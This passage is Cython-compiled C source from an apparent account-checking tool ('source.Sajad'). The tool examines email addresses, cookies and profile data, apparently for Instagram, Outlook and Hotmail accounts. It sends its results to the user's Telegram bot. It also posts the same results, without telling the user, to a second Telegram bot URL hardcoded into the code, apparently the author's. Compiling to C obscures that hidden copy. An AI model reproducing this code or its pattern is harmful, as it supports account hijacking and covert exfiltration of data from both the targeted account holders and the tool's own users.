            __Pyx_XDECREF_SET(__pyx_v_infosand, ((PyObject*)__pyx_t_8));
            __pyx_t_8 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_requests); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 650, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 650, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

            
            __pyx_t_11 = PyTuple_New(6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 651, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_24 = 0;
            __pyx_t_7 = 127;
            __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
            __pyx_t_24 += 28;
            __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
            PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_kp_u_https_api_telegram_org_bot);
            __pyx_t_25 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_token); if (unlikely(!__pyx_t_25)) __PYX_ERR(0, 651, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_25);
            __pyx_t_26 = __Pyx_PyObject_FormatSimple(__pyx_t_25, __pyx_empty_unicode); if (unlikely(!__pyx_t_26)) __PYX_ERR(0, 651, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_26);
            __Pyx_DECREF(__pyx_t_25); __pyx_t_25 = 0;
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_26) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_26) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_26);
            __Pyx_GIVEREF(__pyx_t_26);
            PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_t_26);
            __pyx_t_26 = 0;
            __Pyx_INCREF(__pyx_kp_u_sendMessage_chat_id);
            __pyx_t_24 += 21;
            __Pyx_GIVEREF(__pyx_kp_u_sendMessage_chat_id);
            PyTuple_SET_ITEM(__pyx_t_11, 2, __pyx_kp_u_sendMessage_chat_id);
            __pyx_t_26 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_Id); if (unlikely(!__pyx_t_26)) __PYX_ERR(0, 651, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_26);
            __pyx_t_25 = __Pyx_PyObject_FormatSimple(__pyx_t_26, __pyx_empty_unicode); if (unlikely(!__pyx_t_25)) __PYX_ERR(0, 651, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_25);
            __Pyx_DECREF(__pyx_t_26); __pyx_t_26 = 0;
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_25) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_25) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_25);
            __Pyx_GIVEREF(__pyx_t_25);
            PyTuple_SET_ITEM(__pyx_t_11, 3, __pyx_t_25);
            __pyx_t_25 = 0;
            __Pyx_INCREF(__pyx_kp_u_text_2);
            __pyx_t_24 += 6;
            __Pyx_GIVEREF(__pyx_kp_u_text_2);
            PyTuple_SET_ITEM(__pyx_t_11, 4, __pyx_kp_u_text_2);
            __Pyx_INCREF(__pyx_v_infosand);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_infosand) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_infosand) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_infosand);
            __Pyx_GIVEREF(__pyx_v_infosand);
            PyTuple_SET_ITEM(__pyx_t_11, 5, __pyx_v_infosand);
            __pyx_t_25 = __Pyx_PyUnicode_Join(__pyx_t_11, 6, __pyx_t_24, __pyx_t_7); if (unlikely(!__pyx_t_25)) __PYX_ERR(0, 651, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_25);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __pyx_t_11 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
              __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_4);
              if (likely(__pyx_t_11)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_11);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_4, function);
              }
            }
            __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_11, __pyx_t_25) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_25);
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_DECREF(__pyx_t_25); __pyx_t_25 = 0;
            if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 650, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 652, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_25 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_25)) __PYX_ERR(0, 652, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_25);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            
            __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_api_telegram_org_bot696846, __pyx_v_infosand); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 653, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_11 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_25))) {
              __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_25);
              if (likely(__pyx_t_11)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_25);
                __Pyx_INCREF(__pyx_t_11);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_25, function);
              }
            }
            __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_25, __pyx_t_11, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_25, __pyx_t_4);
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 652, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_25); __pyx_t_25 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
            goto __pyx_L26_exception_handled;
          }
          goto __pyx_L27_except_error;
          __pyx_L27_except_error:;

          
          __Pyx_XGIVEREF(__pyx_t_3);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
          goto __pyx_L1_error;
          __pyx_L26_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_3);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
          __pyx_L32_try_end:;
        }

        
        if (unlikely(!__pyx_v_print)) { __Pyx_RaiseUnboundLocalError("print"); __PYX_ERR(0, 654, __pyx_L1_error) }
        __Pyx_INCREF(__pyx_v_print);
        __pyx_t_9 = __pyx_v_print; __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_12 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_10, __pyx_v_infosand) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_v_infosand);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 654, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        
        goto __pyx_L23;
      }

      
      /*else*/ {
        __pyx_t_22 = (__Pyx_PyUnicode_ContainsTF(__pyx_kp_u_outlook_com, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_22 < 0)) __PYX_ERR(0, 656, __pyx_L1_error)
        __pyx_t_23 = (__pyx_t_22 != 0);
        if (__pyx_t_23) {

          
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badout); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 657, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_9 = __Pyx_PyInt_AddObjC(__pyx_t_12, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 657, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badout, __pyx_t_9) < 0) __PYX_ERR(0, 657, __pyx_L1_error)
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

          
          goto __pyx_L46;
        }

        
        /*else*/ {
          __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badhot); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 659, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_12 = __Pyx_PyInt_AddObjC(__pyx_t_9, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 659, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badhot, __pyx_t_12) < 0) __PYX_ERR(0, 659, __pyx_L1_error)
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_L46:;
      }
      __pyx_L23:;

      
      goto __pyx_L22;
    }

    
    /*else*/ {
      __pyx_t_23 = (__Pyx_PyUnicode_ContainsTF(__pyx_kp_u_outlook_com, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_23 < 0)) __PYX_ERR(0, 661, __pyx_L1_error)
      __pyx_t_22 = (__pyx_t_23 != 0);
      if (__pyx_t_22) {

        
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badigout); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 662, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_9 = __Pyx_PyInt_AddObjC(__pyx_t_12, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 662, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badigout, __pyx_t_9) < 0) __PYX_ERR(0, 662, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

        
        goto __pyx_L47;
      }

      
      /*else*/ {
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badighot); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 664, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_12 = __Pyx_PyInt_AddObjC(__pyx_t_9, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 664, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badighot, __pyx_t_12) < 0) __PYX_ERR(0, 664, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      }
      __pyx_L47:;
    }
    __pyx_L22:;

    
  }
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loob); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 666, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_12 = __Pyx_PyInt_AddObjC(__pyx_t_5, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 666, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loob, __pyx_t_12) < 0) __PYX_ERR(0, 666, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_25);
  __Pyx_XDECREF(__pyx_t_26);
  __Pyx_AddTraceback("source.Sajad.chk", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XDECREF(__pyx_v_dom);
  __Pyx_XDECREF(__pyx_v_domin);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_email);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_heedrs);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_req);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_rr);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_bio);
  __Pyx_XDECREF(__pyx_v_fol);
  __Pyx_XDECREF(__pyx_v_fols);
  __Pyx_XDECREF(__pyx_v_id);
  __Pyx_XDECREF(__pyx_v_haha);
  __Pyx_XDECREF(__pyx_v_ada);
  __Pyx_XDECREF(__pyx_v_s);
  __Pyx_XDECREF(__pyx_v_rest);
  __Pyx_XDECREF(__pyx_v_re);
  __Pyx_XDECREF(__pyx_v_datet);
  __Pyx_XDECREF(__pyx_v_print);
  __Pyx_XDECREF(__pyx_v_Panel);
  __Pyx_XDECREF(__pyx_v_Console);
  __Pyx_XDECREF(__pyx_v_Text);
  __Pyx_XDECREF(__pyx_v_infoprint);
  __Pyx_XDECREF(__pyx_v_infosand);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5Sajad_9idtle(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_6source_5Sajad_9idtle = {"idtle", (PyCFunction)__pyx_pw_6source_5Sajad_9idtle, METH_O, 0};
static PyObject *__pyx_pw_6source_5Sajad_9idtle(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("idtle (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_5Sajad_8idtle(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_5Sajad_8idtle(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_text = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_error = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  int __pyx_t_12;
  char const *__pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("idtle", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 670, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 670, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_os); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 670, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 670, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_8, __pyx_n_u_nt, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 670, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (__pyx_t_9) {
        __Pyx_INCREF(__pyx_n_u_cls);
        __pyx_t_5 = __pyx_n_u_cls;
      } else {
        __Pyx_INCREF(__pyx_n_u_clear);
        __pyx_t_5 = __pyx_n_u_clear;
      }
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 670, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_output); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 671, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 671, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_Text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 672, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_kp_u_1_36m_Telegram_ID_Giriniz) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u_1_36m_Telegram_ID_Giriniz);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 672, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_text = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_console); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 673, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_input); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 673, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_6 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_v_text) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_text);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 673, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyNumber_Int(__pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 673, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_Id, __pyx_t_5) < 0) __PYX_ERR(0, 673, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
    if (__pyx_t_10) {
      __Pyx_AddTraceback("source.Sajad.idtle", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 674, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_6);
      __pyx_v_error = __pyx_t_6;
      /*try:*/ {

        
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_idtle); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 675, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 675, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_error);
          __pyx_v_error = NULL;
          goto __pyx_L15;
        }
        __pyx_L14_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_14 = 0; __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16) < 0)) __Pyx_ErrFetch(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_19);
          __pyx_t_10 = __pyx_lineno; __pyx_t_12 = __pyx_clineno; __pyx_t_13 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_error);
            __pyx_v_error = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_XGIVEREF(__pyx_t_19);
            __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
          }
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_15);
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_ErrRestore(__pyx_t_14, __pyx_t_15, __pyx_t_16);
          __pyx_t_14 = 0; __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0;
